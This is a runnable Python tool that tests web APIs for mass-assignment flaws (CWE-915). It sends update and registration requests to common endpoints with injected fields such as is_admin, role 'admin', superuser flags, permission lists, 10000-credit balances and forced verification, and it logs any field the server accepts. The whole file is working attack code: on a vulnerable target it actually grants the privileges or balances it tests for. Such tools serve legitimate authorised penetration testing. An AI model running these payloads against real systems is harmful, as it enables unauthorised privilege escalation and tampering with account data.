#!/usr/bin/env python3
"""
Mass Assignment Vulnerability Tester
Tests for mass assignment vulnerabilities in APIs
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin

class MassAssignmentTester:
    """Tester for mass assignment vulnerabilities"""

    def __init__(self, target_url, auth_token=None, output_file=None):
        self.target_url = target_url
        self.auth_token = auth_token
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Content-Type': 'application/json'
        })

        if auth_token:
            self.session.headers.update({
                'Authorization': f'Bearer {auth_token}' if not auth_token.startswith('Bearer') else auth_token
            })

    def scan(self):
        """Run mass assignment tests"""
        print(f"[*] Starting mass assignment testing on {self.target_url}")

        # Test privilege escalation
        self._test_privilege_escalation()

        # Test hidden parameter discovery
        self._test_hidden_parameters()

        # Test object injection
        self._test_object_injection()

        # Test role manipulation
        self._test_role_manipulation()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_privilege_escalation(self):
        """Test privilege escalation via mass assignment"""
        print("[*] Testing privilege escalation via mass assignment...")

        # Common privilege fields
        privilege_fields = [
            {'is_admin': True},
            {'admin': True},
            {'role': 'admin'},
            {'role': 'administrator'},
            {'is_staff': True},
            {'is_superuser': True},
            {'permissions': ['admin', 'write', 'delete']},
            {'user_role': 'admin'},
            {'account_type': 'admin'},
            {'privilege_level': 99},
            {'access_level': 'admin'},
        ]

        endpoints = [
            '/api/user/update',
            '/api/users/me',
            '/api/profile/update',
            '/api/account/update',
            '/user/edit',
        ]

        base_url = urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc

        for endpoint in endpoints:
            test_url = urljoin(base_url, endpoint)

            for privilege_field in privilege_fields:
                # Create payload with privilege field
                test_data = {
                    'name': 'Test User',
                    'email': 'test@example.com',
                    **privilege_field
                }

                try:
                    response = self.session.put(test_url, json=test_data, timeout=10)

                    if response.status_code in [200, 201]:
                        # Check if privilege field was accepted
                        try:
                            response_data = response.json()

                            # Check if our injected field appears in response
                            for key, value in privilege_field.items():
                                if key in response_data:
                                    vuln = {
                                        'type': 'Mass Assignment - Privilege Escalation',
                                        'severity': 'critical',
                                        'url': test_url,
                                        'payload': privilege_field,
                                        'evidence': f'Privilege field "{key}" accepted and set to {response_data[key]}',
                                        'description': 'Can escalate privileges via mass assignment',
                                        'cwe': 'CWE-915',
                                        'impact': 'Become administrator, full system compromise',
                                        'remediation': 'Use allow-list for assignable parameters'
                                    }
                                    self.vulnerabilities.append(vuln)
                                    print(f"[!] CRITICAL: Privilege escalation via {key}")
                                    return
                        except:
                            pass

                except:
                    pass

    def _test_hidden_parameters(self):
        """Test for undocumented hidden parameters"""
        print("[*] Testing hidden parameter discovery...")

        # Common hidden parameters
        hidden_params = [
            'id',
            'user_id',
            'account_id',
            'created_at',
            'updated_at',
            'is_verified',
            'is_active',
            'status',
            'credits',
            'balance',
            'points',
            'subscription_level',
            'plan',
            'verified',
            'approved',
        ]

        endpoints = [
            '/api/user/create',
            '/api/users',
            '/api/profile',
            '/api/account/register',
        ]

        base_url = urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc

        for endpoint in endpoints:
            test_url = urljoin(base_url, endpoint)

            # Build test payload with hidden params
            test_data = {
                'username': 'testuser',
                'email': 'test@example.com',
                'password': 'Test123!',
            }

            # Add hidden parameters
            for param in hidden_params[:10]:  # Test first 10
                if param == 'balance' or param == 'credits' or param == 'points':
                    test_data[param] = 10000
                elif param == 'is_verified' or param == 'is_active' or param == 'verified':
                    test_data[param] = True
                elif param.endswith('_id'):
                    test_data[param] = 1
                else:
                    test_data[param] = 'injected_value'

            try:
                response = self.session.post(test_url, json=test_data, timeout=10)

                if response.status_code in [200, 201]:
                    try:
                        response_data = response.json()

                        # Check which hidden params were accepted
                        accepted_params = []
                        for param in hidden_params[:10]:
                            if param in response_data:
                                accepted_params.append(param)

                        if accepted_params:
                            vuln = {
                                'type': 'Mass Assignment - Hidden Parameters',
                                'severity': 'high',
                                'url': test_url,
                                'evidence': f'Hidden parameters accepted: {accepted_params}',
                                'description': 'Undocumented parameters can be set',
                                'cwe': 'CWE-915',
                                'impact': 'Modify internal fields, bypass validation',
                                'remediation': 'Explicitly define allowed parameters'
                            }
                            self.vulnerabilities.append(vuln)
                            print(f"[!] Hidden parameters accepted: {accepted_params}")
                            return
                    except:
                        pass

            except:
                pass

    def _test_object_injection(self):
        """Test object property injection"""
        print("[*] Testing object injection...")

        endpoints = [
            '/api/user/update',
            '/api/profile/update',
        ]

        base_url = urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc

        # Nested object injection attempts
        injection_payloads = [
            {
                'user': {
                    'name': 'Test',
                    'role': 'admin',
                    'is_admin': True
                }
            },
            {
                'profile': {
                    'bio': 'test',
                    'verified': True,
                    'premium': True
                }
            },
            {
                'settings': {
                    'theme': 'dark',
                    'permissions': ['admin', 'write', 'delete']
                }
            },
        ]

        for endpoint in endpoints:
            test_url = urljoin(base_url, endpoint)

            for payload in injection_payloads:
                try:
                    response = self.session.put(test_url, json=payload, timeout=10)

                    if response.status_code in [200, 201]:
                        try:
                            response_data = response.json()

                            # Check if nested objects were accepted
                            for key in payload.keys():
                                if key in response_data:
                                    if isinstance(response_data[key], dict):
                                        # Check for our injected fields
                                        injected = [k for k in payload[key].keys() if k in response_data[key]]
                                        if injected:
                                            vuln = {
                                                'type': 'Mass Assignment - Object Injection',
                                                'severity': 'high',
                                                'url': test_url,
                                                'payload': payload,
                                                'evidence': f'Nested object properties injected: {injected}',
                                                'description': 'Can inject properties into nested objects',
                                                'cwe': 'CWE-915',
                                                'impact': 'Modify object properties, privilege escalation',
                                                'remediation': 'Validate nested object properties'
                                            }
                                            self.vulnerabilities.append(vuln)
                                            print(f"[!] Object injection successful")
                                            return
                        except:
                            pass

                except:
                    pass

    def _test_role_manipulation(self):
        """Test role and permission manipulation"""
        print("[*] Testing role manipulation...")

        role_payloads = [
            {'roles': ['admin', 'user']},
            {'groups': ['administrators']},
            {'permissions': ['read', 'write', 'delete', 'admin']},
            {'scopes': ['user:write', 'admin:read']},
            {'capabilities': ['manage_users', 'manage_settings']},
        ]

        endpoints = [
            '/api/user/update',
            '/api/users/me',
            '/api/profile',
        ]

        base_url = urlparse(self.target_url).scheme + "://" + urlparse(self.target_url).netloc

        for endpoint in endpoints:
            test_url = urljoin(base_url, endpoint)

            for role_payload in role_payloads:
                test_data = {
                    'name': 'Test User',
                    **role_payload
                }

                try:
                    response = self.session.put(test_url, json=test_data, timeout=10)

                    if response.status_code in [200, 201]:
                        try:
                            response_data = response.json()

                            # Check if role fields were accepted
                            for key in role_payload.keys():
                                if key in response_data:
                                    vuln = {
                                        'type': 'Mass Assignment - Role Manipulation',
                                        'severity': 'critical',
                                        'url': test_url,
                                        'payload': role_payload,
                                        'evidence': f'Role field "{key}" accepted',
                                        'description': 'Can modify user roles and permissions',
                                        'cwe': 'CWE-915',
                                        'impact': 'Grant unauthorized permissions',
                                        'remediation': 'Restrict role assignment to admin endpoints'
                                    }
                                    self.vulnerabilities.append(vuln)
                                    print(f"[!] CRITICAL: Role manipulation via {key}")
                                    return
                        except:
                            pass

                except:
                    pass

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 mass_assignment.py <url> [auth_token] [output_file]")
        print("\nExample:")
        print("  python3 mass_assignment.py https://api.example.com")
        print("  python3 mass_assignment.py https://api.example.com eyJhbGc...")
        print("\nTests for:")
        print("  - Privilege escalation (is_admin, role)")
        print("  - Hidden parameter discovery")
        print("  - Object property injection")
        print("  - Role and permission manipulation")
        sys.exit(1)

    target = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 and not sys.argv[2].endswith('.json') else None
    output = sys.argv[3] if len(sys.argv) > 3 else (sys.argv[2] if len(sys.argv) > 2 and sys.argv[2].endswith('.json') else None)

    tester = MassAssignmentTester(target, token, output)
    results = tester.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
